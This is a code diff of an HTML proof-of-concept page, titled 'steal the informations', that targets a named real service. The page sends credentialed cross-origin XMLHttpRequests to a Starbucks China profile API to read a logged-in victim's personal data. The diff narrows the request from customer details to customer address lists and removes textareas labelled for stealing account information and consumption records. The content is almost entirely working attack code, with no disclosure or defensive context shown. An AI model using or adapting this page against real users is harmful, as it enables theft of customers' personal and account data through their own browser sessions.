@@ -4,17 +4,9 @@
 <meta name="referrer" content="never">
 </head>
 <title>steal the informations</title>
-<div text="steal account's information">
-steal account's information
-<textarea id="account" style="width: 200px; height: 150px;"></textarea>
-</div>
 <div text="steal customer's personal informaiton">
-steal customer's personal informaiton
+steal customer's personal address
 <textarea id="customer" style="width: 200px; height: 150px;"></textarea>
-</div>
-<div text="steal customer's consumption">
-steal customer's consumption
-<textarea id="consumption" style="width: 200px; height: 150px;"></textarea>
 </div>
 <script>
 
@@ -29,7 +21,7 @@ steal customer's consumption
 		}
 	}
     	
-	xmlhttp1.open("GET","https://profile.starbucks.com.cn/api/Customers/detail",true);
+	xmlhttp1.open("GET","https://profile.starbucks.com.cn/api/Customers/addresses/list",true);
 	xmlhttp1.withCredentials = true;
 	xmlhttp1.send();
 	
